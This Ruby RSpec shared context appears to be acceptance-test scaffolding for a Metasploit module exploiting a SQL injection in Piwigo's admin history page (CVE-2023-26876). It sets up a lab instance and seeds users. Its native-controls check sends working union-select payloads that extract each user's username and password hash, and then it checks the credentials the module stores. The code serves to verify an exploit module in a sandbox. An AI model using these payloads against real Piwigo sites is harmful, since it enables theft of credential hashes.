# frozen_string_literal: true

require 'base64'
require 'digest'
require 'json'
require 'net/http'
require 'open3'
require 'uri'
require 'zlib'
require_relative 'profiles'

RSpec.shared_context 'native Piwigo target' do
  include_context 'module target'

  before(:all) do
    @pw_profile = PiwigoProfiles.fetch
    @pw_native = { requests: [], commands: [], calls: [], reports: [] }
    begin
      pw_counters('before')
      if @pw_profile.fetch('mode') == 'unrelated'
        expect(pw_request('/').body).to include('module-target-http-marker')
      else
        pw_verify_sources
        pw_install
        pw_native_controls
      end
      endpoint = target_endpoint('reporting_db')
      expect(pw_sql("SELECT count(*) FROM information_schema.tables WHERE table_schema='public'").strip).to eq('0')
      expect(console_command("db_connect module_framework:module-target-framework-db-password@#{endpoint.fetch('host')}:#{endpoint.fetch('port')}/module_targets", timeout: 120)).not_to match(/\[-\]|Error|Exception/)
      expect(console_command('db_status')).to include('Connected to module_targets. Connection type: postgresql.')
      output = console_command('irb -e \'puts "PIWIGO_PROVENANCE=" + {ruby: RUBY_VERSION, config: Msf::Config.config_directory, owner_sha256: Digest::SHA256.file("modules/auxiliary/gather/piwigo_cve_2023_26876.rb").hexdigest}.to_json\'')
      provenance = JSON.parse(output.match(/^PIWIGO_PROVENANCE=(.+)$/)[1])
      expect(provenance.fetch('config')).to eq(ENV.fetch('MSF_CFGROOT_CONFIG'))
      expect(provenance.fetch('owner_sha256')).to eq(Digest::SHA256.file("modules/#{PiwigoProfiles::OWNER}.rb").hexdigest)
      @pw_native[:provenance] = provenance
      @pw_native[:preflight] = 'passed'
    ensure
      pw_save
    end
  end

  before do |example|
    @pw_workspace = 'piwigo_' + example.metadata.fetch(:scoped_id).tr(':', '_')
    expect(console_command("workspace -a #{@pw_workspace}")).not_to include('[-]')
    expect(pw_reports).to eq([])
  end

  after(:all) do
    expect(pw_identity).to eq(@pw_baseline) if @pw_baseline
    pw_verify_sources unless @pw_profile.fetch('mode') == 'unrelated'
    expect(console_command('irb -e \'puts "PIWIGO_STATE=" + {sessions: framework.sessions.keys, jobs: framework.jobs.keys}.to_json\'')).to include('PIWIGO_STATE={"sessions":[],"jobs":[]}')
  ensure
    pw_counters('after')
    pw_save
  end

  def pw_prefix
    @pw_profile.fetch('prefix')
  end

  def pw_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-piwigo.json'), JSON.pretty_generate(@pw_native)) if @pw_native
  end

  def pw_command(role, *arguments, user: nil)
    argv = target_runtime.fetch('compose') + ['exec', '-T']
    argv += ['--user', user] if user
    argv += [role, 'timeout', '25', *arguments]
    output, error, status = Open3.capture3(*argv)
    @pw_native.fetch(:commands) << { argv: argv, stdout_base64: Base64.strict_encode64(output), stderr: error, exitstatus: status.exitstatus }
    pw_save
    raise "Native Piwigo command failed: #{role}: #{error}" unless status.success?

    output
  end

  def pw_identity
    JSON.parse(pw_command('app', 'php', '/opt/module-target/control.php', user: 'www-data'))
  end

  def pw_verify_sources
    version = @pw_profile.fetch('release')
    cache = File.expand_path('../../../tmp/module-target-piwigo-sources', __dir__)
    expect(Digest::SHA256.file(File.join(cache, "#{version}.zip")).hexdigest).to eq(PiwigoProfiles::RELEASES.fetch(version).fetch('sha256'))
    entries = JSON.parse(File.read(File.join(cache, "#{version}-files.json")))
    extracted = File.join(cache, version)
    actual = Dir.glob(File.join(extracted, '**', '*'), File::FNM_DOTMATCH).select { |name| File.file?(name) }
    expect(actual.sort).to eq(entries.keys.map { |name| File.join(extracted, name) }.sort)
    entries.each { |name, digest| expect(Digest::SHA256.file(File.join(extracted, name)).hexdigest).to eq(digest) }
  end

  def pw_request(path, form: nil, cookies: nil, body: nil, content_type: nil)
    endpoint = target_endpoint('app')
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 5
    http.read_timeout = 15
    request = form || body ? Net::HTTP::Post.new(path) : Net::HTTP::Get.new(path)
    request['Cookie'] = cookies.map { |key, value| "#{key}=#{value}" }.join('; ') if cookies
    request.set_form_data(form) if form
    if body
      request.body = body
      request['Content-Type'] = content_type
    end
    response = http.request(request)
    @pw_native.fetch(:requests) << { method: request.method, path: path, headers_sent: request.to_hash, body_sent_base64: request.body && Base64.strict_encode64(request.body.b), code: response.code, headers_received: response.to_hash, body_base64: Base64.strict_encode64(response.body.to_s.b) }
    pw_save
    if cookies
      response.get_fields('set-cookie').to_a.each do |value|
        key, data = value.split(';', 2).first.split('=', 2)
        cookies[key] = data
      end
    end
    response
  ensure
    http&.finish if http&.started?
  end

  def pw_api(method, parameters = {})
    response = pw_request("#{pw_prefix}/ws.php?format=json", form: { 'method' => method }.merge(parameters), cookies: @pw_admin)
    expect(response.code).to eq('200')
    parsed = JSON.parse(response.body)
    expect(parsed.fetch('stat')).to eq('ok'), parsed.inspect
    parsed.fetch('result')
  end

  def pw_login(username, password, expected: '302')
    cookies = {}
    expect(pw_request("#{pw_prefix}/identification.php", cookies: cookies).code).to eq('200')
    response = pw_request("#{pw_prefix}/identification.php", form: { 'username' => username, 'password' => password, 'login' => 'Login' }, cookies: cookies)
    expect(response.code).to eq(expected)
    cookies
  end

  def pw_install
    form = pw_request("#{pw_prefix}/install.php?language=en_UK")
    expect(form.code).to eq('200')
    expect(form.body).to include('name="dbhost"')
    installed = pw_request("#{pw_prefix}/install.php?language=en_UK", form: {
      'install' => 'Install', 'dbhost' => 'db', 'dbuser' => 'module_target', 'dbpasswd' => 'module-target-db-password',
      'dbname' => 'piwigo', 'prefix' => 'piwigo_', 'admin_name' => PiwigoProfiles::ADMIN,
      'admin_pass1' => PiwigoProfiles::PASSWORD, 'admin_pass2' => PiwigoProfiles::PASSWORD, 'admin_mail' => 'module-admin@example.test'
    })
    expect(installed.code).to eq('200')
    expect(installed.body).to include('Congratulations, Piwigo installation is completed')
    identity = pw_identity
    expect(identity.values_at('version', 'php', 'uid', 'sapi', 'database', 'table_prefix')).to eq([@pw_profile.fetch('release'), '7.3.11', 33, 'cli', 'piwigo', 'piwigo_'])
    release = PiwigoProfiles::RELEASES.fetch(@pw_profile.fetch('release'))
    expect(identity.fetch('source_sha256')).to eq(release.slice(*identity.fetch('source_sha256').keys))
    # Piwigo explicitly rejects even correct credentials without a session
    # cookie from an earlier ordinary page request. Prove that prerequisite.
    no_cookie = pw_request("#{pw_prefix}/identification.php", form: { 'username' => PiwigoProfiles::ADMIN, 'password' => PiwigoProfiles::PASSWORD, 'login' => 'Login' })
    expect(no_cookie.code).to eq('200')
    expect(no_cookie.body).to include('Cookies are blocked or not supported by your browser.')
    pw_login(PiwigoProfiles::ADMIN, 'module-target-wrong-password', expected: '200')
    @pw_admin = pw_login(PiwigoProfiles::ADMIN, PiwigoProfiles::PASSWORD)
    @pw_session = pw_api('pwg.session.getStatus')
    PiwigoProfiles::MEMBERS.each do |username|
      pw_api('pwg.users.add', 'username' => username, 'password' => PiwigoProfiles::PASSWORD, 'password_confirm' => PiwigoProfiles::PASSWORD, 'pwg_token' => @pw_session.fetch('pwg_token'))
    end
    # Complete the application's normal MD5-to-phpass upgrade before snapshots.
    @pw_reader = pw_login('module_reader', PiwigoProfiles::PASSWORD)
    pw_gallery unless @pw_profile.fetch('mode') == 'empty'
    @pw_baseline = pw_identity
    expect(@pw_baseline.fetch('users').map { |row| row.values_at('username', 'status') }).to eq([[PiwigoProfiles::ADMIN, 'webmaster'], ['guest', 'guest'], *PiwigoProfiles::MEMBERS.map { |username| [username, 'normal'] }])
    expect(@pw_baseline.fetch('users').find { |row| row.fetch('username') == 'guest' }.fetch('password')).to be_nil
    limits = @pw_baseline.fetch('limits').transform_values(&:to_i)
    expect(limits.fetch('group_concat_max_len')).to eq(96)
    expect(limits.fetch('full_length')).to be > 96
    expect(limits.fetch('truncated_length')).to eq(96)
  end

  def pw_gallery
    album = pw_api('pwg.categories.add', 'name' => 'Owned acceptance album', 'status' => 'public')
    # Source-generated ordinary 20x20 RGB PNG, uploaded through the real API.
    chunk = ->(kind, data) { [data.bytesize].pack('N') + kind + data + [Zlib.crc32(kind + data)].pack('N') }
    png = "\x89PNG\r\n\x1a\n".b + chunk.call('IHDR', [20, 20, 8, 2, 0, 0, 0].pack('NNCCCCC')) + chunk.call('IDAT', Zlib.deflate(("\0".b + "\x22\x88\xcc".b * 20) * 20)) + chunk.call('IEND', ''.b)
    boundary = 'module-target-piwigo-upload'
    fields = { 'method' => 'pwg.images.addSimple', 'category' => album.fetch('id').to_s, 'name' => 'Owned acceptance photo', 'level' => '0', 'pwg_token' => @pw_session.fetch('pwg_token') }
    parts = fields.map { |key, value| "--#{boundary}\r\nContent-Disposition: form-data; name=\"#{key}\"\r\n\r\n#{value}".b }
    parts << "--#{boundary}\r\nContent-Disposition: form-data; name=\"image\"; filename=\"owned.png\"\r\nContent-Type: image/png\r\n\r\n".b + png
    body = parts.join("\r\n".b) + "\r\n--#{boundary}--\r\n".b
    response = pw_request("#{pw_prefix}/ws.php?format=json", cookies: @pw_admin, body: body, content_type: "multipart/form-data; boundary=#{boundary}")
    expect(response.code).to eq('200')
    expect(JSON.parse(response.body).fetch('stat')).to eq('ok')
    @pw_native[:png_sha256] = Digest::SHA256.hexdigest(png)
    expect(pw_request("#{pw_prefix}/index.php").body).to include('Piwigo')
  end

  def pw_history(value, cookies: @pw_admin)
    pw_request("#{pw_prefix}/admin.php?#{URI.encode_www_form('page' => 'history', 'filter_image_id' => '1', 'filter_user_id' => value)}", cookies: cookies)
  end

  def pw_native_controls
    ordinary = pw_history('1')
    expect(ordinary.code).to eq('200')
    expect(ordinary.body).to include('var filter_user_name = "module_admin";')
    marker = 'module_target_native_sql'
    injected = pw_history('123123123 union all select 0x' + marker.unpack1('H*'))
    if @pw_profile.fetch('mode') == 'fixed'
      expect(injected.body.to_s).not_to include(marker)
    else
      expect(injected.code).to eq('200')
      expect(injected.body).to include("var filter_user_name = \"#{marker}\";")
      @pw_baseline.fetch('users').each do |row|
        sql = 'select hex(concat_ws(0x3b,username,ifnull(password,repeat(0x31,0)))) from piwigo_users where id=' + Integer(row.fetch('id'), 10).to_s
        response = pw_history('123123123 union all ' + sql)
        scalar = response.body.to_s.match(/var filter_user_name = "([0-9A-F]+)";/)
        expect(scalar).not_to be_nil
        expect([scalar[1]].pack('H*')).to eq((row.fetch('username') + ';' + row.fetch('password').to_s).b)
      end
    end
    denied = pw_history('123123123 union all select 0x' + marker.unpack1('H*'), cookies: @pw_reader)
    expect(denied.body.to_s).not_to include("var filter_user_name = \"#{marker}\";")
    expect(pw_identity).to eq(@pw_baseline)
  end

  def pw_sql(query)
    pw_command('reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query)
  end

  def pw_reports
    raise ArgumentError, 'Invalid Piwigo workspace' unless @pw_workspace.match?(/\Apiwigo_[0-9_]+\z/)

    rows = JSON.parse(pw_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.username),'[]'::json) FROM (
        SELECT p.username,s.data AS private_data,s.type,s.jtr_format,c.origin_type,o.module_full_name,
          service.name AS service,service.port,service.proto,host(h.address::inet) AS address
        FROM metasploit_credential_cores c JOIN workspaces w ON w.id=c.workspace_id
        LEFT JOIN metasploit_credential_publics p ON p.id=c.public_id LEFT JOIN metasploit_credential_privates s ON s.id=c.private_id
        LEFT JOIN metasploit_credential_origin_services o ON o.id=c.origin_id AND c.origin_type='Metasploit::Credential::Origin::Service'
        LEFT JOIN services service ON service.id=o.service_id LEFT JOIN hosts h ON h.id=service.host_id
        WHERE w.name='#{@pw_workspace}'
      ) row
    SQL
    @pw_native.fetch(:reports) << { workspace: @pw_workspace, rows: rows }
    pw_save
    rows
  end

  def pw_owner(options = {}, action: 'run')
    output = run_target_module(PiwigoProfiles::OWNER, 'app', {
      'SSL' => false, 'TARGETURI' => "#{pw_prefix}/", 'USERNAME' => PiwigoProfiles::ADMIN,
      'PASSWORD' => PiwigoProfiles::PASSWORD, 'HttpClientTimeout' => 5
    }.merge(options), action: action, allow_errors: true, command_timeout: 90)
    @pw_native.fetch(:calls) << { workspace: @pw_workspace, action: action, options: options, output_base64: Base64.strict_encode64(output.b) }
    pw_save
    # Capture actual persistence even when a later output expectation fails.
    pw_reports
    # Console transport returns bytes; Piwigo usernames are UTF-8 text.
    text = output.dup.force_encoding(Encoding::UTF_8)
    expect(text.valid_encoding?).to be(true)
    text
  end

  def pw_success(options = {})
    output = pw_owner(options)
    expect(output).not_to match(/Auxiliary (?:failed|aborted)/)
    expect(output).to include('Piwigo Users', *PiwigoProfiles::MEMBERS)
    expected = @pw_baseline.fetch('users').reject { |row| row.fetch('password').to_s.empty? }.to_h { |row| row.values_at('username', 'password') }
    records = pw_reports
    expect(records.length).to eq(expected.length)
    expect(records.to_h { |row| row.values_at('username', 'private_data') }).to eq(expected)
    records.each do |row|
      endpoint = target_endpoint('app')
      expect(row.values_at('type', 'origin_type', 'module_full_name', 'service', 'proto', 'address', 'port')).to eq(['Metasploit::Credential::NonreplayableHash', 'Metasploit::Credential::Origin::Service', PiwigoProfiles::OWNER, 'piwigo', 'tcp', endpoint.fetch('host'), endpoint.fetch('port')])
      expect(row.fetch('jtr_format')).to eq(row.fetch('private_data').start_with?('$P$') ? 'phpass' : 'raw-md5')
    end
    expect(pw_identity).to eq(@pw_baseline)
    output
  end

  def pw_refusal(options = {}, action: 'run')
    before = pw_reports
    output = pw_owner(options, action: action)
    expect(output).not_to include('Piwigo Users')
    expect(pw_reports).to eq(before)
    expect(pw_identity).to eq(@pw_baseline) if @pw_baseline
    output
  end

  def pw_counters(phase)
    roles = @pw_profile.fetch('mode') == 'unrelated' ? %w[app reporting_db] : %w[app db reporting_db]
    values = roles.to_h do |role|
      counters = %w[memory.events pids.events].to_h do |name|
        numbers = target_exec(role, 'cat', "/sys/fs/cgroup/#{name}").lines.to_h do |line|
          key, value = line.split
          [key, Integer(value, 10)]
        end
        [name, numbers]
      end
      [role, counters]
    end
    File.write(File.join(target_runtime.fetch('artifacts'), "piwigo-resources-#{phase}.json"), JSON.pretty_generate(values))
    values.each_value do |counters|
      expect(counters.fetch('memory.events').values_at('oom', 'oom_kill')).to eq([0, 0])
      expect(counters.fetch('pids.events').fetch('max')).to eq(0)
    end
  end
end
